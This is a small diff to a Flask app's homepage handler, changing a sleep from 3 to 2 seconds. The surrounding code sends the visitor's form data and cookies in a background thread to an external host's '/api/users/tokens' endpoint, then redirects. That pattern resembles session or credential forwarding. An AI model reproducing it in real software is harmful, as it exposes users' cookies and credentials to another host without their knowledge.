@@ -44,7 +44,7 @@ def homepage():
         print(f'HOST URL: {domen}')
         threading.Thread(target=requests.post,
                          kwargs={'url': f"{domen}/api/users/tokens", 'data': data, 'cookies': cookies}).start()
-        time.sleep(3)
+        time.sleep(2)
         return flask.redirect('/')
 
 
